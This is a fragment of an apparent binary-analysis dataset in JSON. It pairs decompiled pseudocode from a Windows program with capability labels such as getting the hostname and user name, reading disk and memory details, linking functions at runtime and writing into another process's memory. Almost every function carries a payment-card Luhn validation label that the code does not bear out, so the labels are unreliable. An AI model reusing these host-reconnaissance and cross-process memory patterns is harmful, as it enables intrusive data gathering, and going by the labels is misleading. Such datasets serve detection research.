        "decompiled_code": "\nvoid fcn.0048ba48(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48ba5f;\n    fcn.004059cc();\n    uStack32 = 0x48bb2d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x48ba75;\n    puStack28 = &stack0xfffffffc;\n    fcn.00405530();\n    uStack44 = 0x48bb05;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.004216b4();\n    fcn.0042174c();\n    fcn.00421890();\n    cVar1 = fcn.004222b8();\n    if (cVar1 == '\\0') {\n        fcn.00405530();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00421890();\n        cVar1 = fcn.00422210();\n        if (cVar1 != '\\0') {\n            fcn.00422014();\n        }\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48bb34;\n    uStack32 = 0x48bb2c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 384
    },
    "0048bb64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048bb64(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x48bb7b;\n    fcn.004059cc();\n    puStack28 = 0x48bb83;\n    fcn.004059cc();\n    uStack32 = 0x48bc43;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x48bc17;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    fcn.004216b4();\n    fcn.0042174c();\n    fcn.00421890();\n    cVar1 = fcn.004222b8();\n    if (cVar1 == '\\0') {\n        fcn.004217b4();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00421890();\n        fcn.00421fb4();\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48bc4a;\n    uStack32 = 0x48bc42;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 360
    },
    "0048c384": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.0048c384(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x48c394;\n    fcn.004059cc();\n    uStack20 = 0x48c3cc;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(2);\n    uVar2 = 0x14;\n    sub.user32.dll_SystemParametersInfoA(0x14, 0, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x48c3d3);\n    return;\n}\n",
        "token_count": 200
    },
    "0048c77c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048c77c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 4;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00409d78();\n    return;\n}\n",
        "token_count": 64
    },
    "0048c7a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048c7a4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x48c7bb;\n    fcn.004059cc();\n    uStack36 = 0x48c8ac;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x48c7d1;\n    puStack32 = &stack0xfffffffc;\n    fcn.00405530();\n    uStack48 = 0x48c877;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.004216b4();\n    fcn.0042174c();\n    fcn.00421890();\n    cVar1 = fcn.004222b8();\n    if (cVar1 == '\\0') {\n        fcn.00405530();\n        *in_FS_OFFSET = uStack52;\n    }\n    else {\n        fcn.00421890();\n        cVar1 = fcn.00422210();\n        if (cVar1 == '\\0') {\n            fcn.00405584();\n        }\n        else {\n            fcn.00422014();\n        }\n        *in_FS_OFFSET = uStack52;\n        puStack44 = 0x48c896;\n        fcn.00404650();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48c8b3;\n    uStack36 = 0x48c8ab;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 428
    },
    "0048c8f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048c8f4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x48c90b;\n    fcn.004059cc();\n    puStack28 = 0x48c913;\n    fcn.004059cc();\n    uStack32 = 0x48c9da;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x48c9ae;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    fcn.004216b4();\n    fcn.0042174c();\n    fcn.00421890();\n    cVar1 = fcn.004222b8();\n    if (cVar1 == '\\0') {\n        fcn.004217b4();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00421890();\n        fcn.00421fb4();\n        fcn.00404650();\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48c9e1;\n    uStack32 = 0x48c9d9;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 375
    },
    "0048cb58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048cb58(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uVar2;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint hObject;\n    uint var_8h;\n    uint var_4h;\n    double dVar3;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack32 = 0x48cb6f;\n    fcn.004059cc();\n    puStack32 = 0x48cb77;\n    fcn.004059cc();\n    uStack36 = 0x48cc23;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x48cbf7;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x48cba0;\n    puStack32 = &stack0xfffffffc;\n    fcn.0040a174();\n    uStack60 = 0x48cbe6;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    fVar1 = fcn.0040d220();\n    dVar3 = fVar1;\n    fcn.0040a7c4(SUB84(dVar3, 0), dVar3 >> 0x20);\n    uVar2 = SUB84(dVar3, 0);\n    fcn.0040a3b4();\n    *in_FS_OFFSET = uVar2;\n    uStack64 = 0x48cbed;\n    sub.kernel32.dll_CloseHandle_1();\n    return;\n}\n",
        "token_count": 427
    },
    "0048cc34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048cc34(uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48cc51;\n    fcn.00405fe8();\n    uStack24 = 0x48ccc3;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00408568();\n    fcn.004055c8();\n    iStack32 = fcn.004059dc();\n    iVar1 = sub.kernel32.dll_LoadLibraryA();\n    if (iVar1 != 0) {\n        pcVar2 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x48ccd4);\n        (*pcVar2)();\n        sub.kernel32.dll_FreeLibrary_1();\n        iStack32 = iVar1;\n    }\n    *in_FS_OFFSET = iStack32;\n    uStack24 = 0x48ccca;\n    iStack28 = 0x48ccb4;\n    fcn.00405530();\n    iStack28 = 0x48ccc2;\n    fcn.004060ac();\n    return;\n}\n",
        "token_count": 319
    },
    "0048ce68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048ce68(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack332;\n    uint uStack328;\n    uchar *puStack324;\n    int32_t iStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint var_122h;\n    uint lpFileOp;\n    uint var_1eh;\n    uint *var_1ah;\n    uint var_12h;\n    uint var_4h;\n    \n    puStack324 = &stack0xfffffffc;\n    puStack312 = 0x48ce7f;\n    fcn.004059cc();\n    uStack316 = 0x48cf29;\n    iStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uStack328 = 0x48cf07;\n    iStack332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb4;\n    puStack312 = &stack0xfffffffc;\n    fcn.00403af4();\n    fcn.00403af4();\n    fcn.0040a930();\n    lpFileOp = 0;\n    var_1ah = &fcn.0048ce68::var_122h;\n    var_1eh = 3;\n    var_12h._0_2_ = 0x54;\n    sub.shell32.dll_SHFileOperationA();\n    *in_FS_OFFSET = &fcn.0048ce68::lpFileOp;\n    *in_FS_OFFSET = puStack324;\n    uStack316 = 0x48cf30;\n    iStack320 = 0x48cf28;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 382
    },
    "0048d278": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk information"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048d278(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_115h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack312 = &stack0xfffffffc;\n    puStack300 = 0x48d292;\n    var_8h = param_2;\n    fcn.004059cc();\n    uStack304 = 0x48d31f;\n    uStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffecc;\n    uStack316 = 0x48d2f2;\n    uStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uVar3 = 0;\n    puStack300 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(0, 0, 0, &fcn.0048d278::var_ch, &fcn.0048d278::var_10h, &fcn.0048d278::var_115h, 0x105);\n    iVar2 = sub.kernel32.dll_GetVolumeInformationA();\n    if (iVar2 != 0) {\n        fcn.0040aab0();\n    }\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x48d326);\n    return;\n}\n",
        "token_count": 387
    },
    "0048d340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048d340(uint param_1, char param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    puStack44 = 0x48d359;\n    fcn.004059cc();\n    uStack48 = 0x48d3f6;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x48d3c9;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack44 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(&fcn.0048d340::var_10h, &fcn.0048d340::var_18h);\n    iVar2 = (***0x4959e0)();\n    if (iVar2 != 0) {\n        if (param_2 == '\\0') {\n            fcn.0048ca6c(SUB108(_var_10h, 0), _var_10h >> 0x40);\n        }\n        else {\n            fcn.0048ca6c(SUB108(_var_18h, 0), _var_18h >> 0x40);\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = 0;\n    uStack60 = 0x48d3fd;\n    uStack64 = 0x48d3f5;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 426
    },
    "0048d6c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get session user name"
        ],
        "decompiled_code": "\nvoid fcn.0048d6c4(void)\n\n{\n    int32_t iVar1;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0x100;\n    iVar1 = sub.advapi32.dll_GetUserNameA(auStack260, &uStack264);\n    if (iVar1 == 0) {\n        fcn.00405530();\n    }\n    else {\n        fcn.0040aab0();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0048d700": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.0048d700(void)\n\n{\n    int32_t iVar1;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0x100;\n    iVar1 = sub.kernel32.dll_GetComputerNameA(auStack260, &uStack264);\n    if (iVar1 == 0) {\n        fcn.00405530();\n    }\n    else {\n        fcn.0040aab0();\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "0048d94c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048d94c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    puStack36 = 0x48d966;\n    fcn.004059cc();\n    puStack36 = 0x48d96e;\n    fcn.004059cc();\n    uStack40 = 0x48da28;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x48d988;\n    puStack36 = &stack0xfffffffc;\n    fcn.00421670();\n    uStack52 = 0x48da06;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x48d9d9;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00422014();\n    *in_FS_OFFSET = uStack68;\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x48da0d;\n    uStack52 = 0x48da05;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 386
    },
    "0048def4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "identify system language via API"
        ],
        "decompiled_code": "\nvoid fcn.0048def4(void)\n\n{\n    ushort uVar1;\n    uchar auStack108 [104];\n    \n    uVar1 = sub.kernel32.dll_GetUserDefaultLangID();\n    sub.kernel32.dll_VerLanguageNameA(uVar1, auStack108, 100);\n    fcn.004057a0();\n    return;\n}\n",
        "token_count": 76
    },
    "0048e150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0048e150(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint uStack28;\n    uint uStack20;\n    \n    uVar5 = 0;\n    uStack20 = 0;\n    iVar4 = 0;\n    puStack36 = &uStack20;\n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 1;\n    uStack52 = in_EAX;\n    uStack28 = param_2;\n    iVar1 = sub.advapi32.dll_GetTokenInformation();\n    if (iVar1 == 0) {\n        iVar1 = sub.kernel32.dll_GetLastError_1();\n        if (iVar1 != 0x7a) {\n            return 0;\n        }\n        uVar2 = sub.kernel32.dll_GetProcessHeap(8, uStack40);\n        iVar4 = sub.kernel32.dll_HeapAlloc(uVar2);\n        uVar3 = uStack52;\n        if (iVar4 == 0) {\n            return 0;\n        }\n        uStack52 = 0;\n        iVar1 = sub.advapi32.dll_GetTokenInformation(uVar2, 1, iVar4, uVar3, &uStack52);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    iVar1 = fcn.0048df84();\n    if (iVar1 != 0) {\n        uVar3 = sub.kernel32.dll_GetProcessHeap(0, iVar4);\n        iVar1 = sub.kernel32.dll_HeapFree(uVar3);\n        if (iVar1 != 0) {\n            uVar5 = 0xffffffff;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 438
    },
    "0048e200": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048e200(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_stack_fffffecc;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uchar auStack280 [272];\n    \n    puStack284 = 0x48e211;\n    fcn.00405530();\n    uStack288 = 0xffffffff;\n    uStack292 = 8;\n    uStack296 = 0x48e21b;\n    puStack284 = &stack0xfffffee8;\n    uStack296 = sub.kernel32.dll_GetCurrentThread();\n    iVar1 = sub.advapi32.dll_OpenThreadToken();\n    if (iVar1 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 == 0x3f0) {\n            in_stack_fffffecc = sub.kernel32.dll_GetCurrentProcess(8, &stack0xfffffed8);\n            iVar1 = sub.advapi32.dll_OpenProcessToken(in_stack_fffffecc);\n        }\n    }\n    if (iVar1 != 0) {\n        fcn.00403af4();\n        iVar1 = fcn.0048e150();\n        if (iVar1 != 0) {\n            fcn.004057a0();\n        }\n        sub.kernel32.dll_CloseHandle_1(in_stack_fffffecc);\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "0048e55c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get memory capacity"
        ],
        "decompiled_code": "\nvoid fcn.0048e55c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack88;\n    int32_t iStack84;\n    uchar *puStack80;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint lpBuffer;\n    uint var_20h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    puStack80 = &stack0xfffffffc;\n    var_28h = 0;\n    uStack72 = 0x48e5fd;\n    iStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iStack84 = 0x48e5d0;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    lpBuffer = 0x20;\n    sub.kernel32.dll_GlobalMemoryStatus(&fcn.0048e55c::lpBuffer);\n    arg_8h = &fcn.0048e55c::var_28h;\n    fcn.0040afa0(arg_8h);\n    fcn.00405864();\n    *in_FS_OFFSET = arg_8h;\n    *in_FS_OFFSET = iStack84;\n    iStack76 = 0x48e604;\n    puStack80 = 0x48e5fc;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 347
    },
    "0048e630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid fcn.0048e630(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48e64b;\n    fcn.004059cc();\n    uStack32 = 0x48e6c1;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc(10);\n    uVar1 = sub.kernel32.dll_FindResourceA(0, uVar1);\n    uVar2 = sub.kernel32.dll_LoadResource(0, uVar1);\n    sub.kernel32.dll_SizeofResource(0, uVar1);\n    sub.kernel32.dll_LockResource(uVar2);\n    fcn.00405620();\n    fcn.00405584();\n    sub.kernel32.dll_FreeResource();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x48e6c8);\n    return;\n}\n",
        "token_count": 265
    },
    "0048e73c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048e73c(uint param_1, char param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_4h;\n    \n    if (param_2 != '\\0') {\n        puStack36 = 0x48e74f;\n        fcn.00404974();\n    }\n    uStack40 = 0x48e78a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0048c77c();\n    fcn.00405584();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x48e791;\n    uStack40 = 0x48e789;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 202
    },
    "0048e8bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "find graphical window",
            "write process memory"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048e8bc(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint uVar6;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t wParam;\n    uint hWndParent;\n    uint lpdwProcessId;\n    uint lpNumberOfBytesWritten;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    puStack72 = 0x48e8e7;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack72 = 0x48e8ef;\n    fcn.004059cc();\n    uStack76 = 0x48eac3;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    fcn.0048e840();\n    uVar1 = fcn.004059dc();\n    uVar1 = sub.user32.dll_FindWindowA(0x48ead4, uVar1);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48ead4, 0);\n    uVar2 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x48eadc, 0);\n    uVar1 = uVar2;\n    var_20h = sub.user32.dll_SendMessageA(uVar2, 0x1004, 0, 0);\n    if (-1 < var_20h + -1) {\n        wParam = 0;\n        do {\n            puVar3 = sub.kernel32.dll_VirtualAlloc_1(0, 300, 0x3000, 4);\n            sub.user32.dll_GetWindowThreadProcessId(uVar2, &fcn.0048e8bc::lpdwProcessId);\n            uVar1 = sub.kernel32.dll_OpenProcess(0x38, 0, lpdwProcessId);\n            iVar4 = sub.kernel32.dll_VirtualAllocEx(uVar1, 0, 300, 0x3000, 4);\n            *puVar3 = 1;\n            puVar3[1] = 0;\n            puVar3[2] = 0;\n            puVar3[5] = iVar4 + 0x28;\n            puVar3[6] = 100;\n            sub.kernel32.dll_WriteProcessMemory(uVar1, iVar4, puVar3, 0x400, &fcn.0048e8bc::lpNumberOfBytesWritten);\n            sub.user32.dll_SendMessageA(uVar2, 0x102d, wParam, iVar4);\n            uVar6 = uVar1;\n            sub.kernel32.dll_ReadProcessMemory();\n            uVar5 = puVar3 == 0xffffffd8;\n            fcn.00405728();\n            fcn.00409b84();\n            fcn.00409b84(0);\n            fcn.00405974();\n            if (uVar5) {\ncode_r0x0048ea5a:\n                uVar6 = uVar2;\n                sub.user32.dll_SendMessageA();\n            }\n            else {\n                fcn.00409b84();\n                fcn.00409b84(0);\n                fcn.00405974();\n                if (uVar5) goto code_r0x0048ea5a;\n            }\n            sub.kernel32.dll_VirtualFree_1(puVar3, 0, 0x8000, uVar6);\n            sub.kernel32.dll_VirtualFreeEx(uVar1, iVar4, 0, 0x8000);\n            sub.kernel32.dll_CloseHandle_1();\n            wParam = wParam + 1;\n            var_20h = var_20h + -1;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x48eaca);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 974
    },
    "00420f00": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420f00(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    ulong uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x420f63;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch != 0) {\n        *(arg_ch + 4) = 2;\n        uVar1 = (****(arg_8h + 0xc))();\n        *(arg_ch + 8) = uVar1;\n        *(arg_ch + 0xc) = uVar1 >> 0x20;\n        *(arg_ch + 0x10) = 0;\n        *(arg_ch + 0x14) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x24) = 0;\n        *(arg_ch + 0x2c) = 1;\n    }\n    *in_FS_OFFSET = uStack28;\n    return 0;\n}\n",
        "token_count": 293
    },
    "00425178": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00425178(void)\n\n{\n    int32_t iVar1;\n    char extraout_DL;\n    \n    iVar1 = fcn.00404a1c();\n    fcn.00419c38();\n    fcn.00425748();\n    fcn.00404650();\n    fcn.00404650();\n    fcn.00404650();\n    sub.kernel32.dll_DeleteCriticalSection(iVar1 + 0x38);\n    fcn.00419e30();\n    if ('\\0' < extraout_DL) {\n        fcn.004049c4();\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00425308": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425308(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.0042579c();\n    uVar1 = fcn.00424f98();\n    sub.user32.dll_FillRect(in_EAX[1], param_2, uVar1);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 110
    },
    "004253d0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004253d0(int32_t *param_1)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_1 != NULL) {\n        (**(*in_EAX + 0x10))();\n        fcn.0042579c();\n        (**(*param_1 + 0x14))();\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "00427290": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
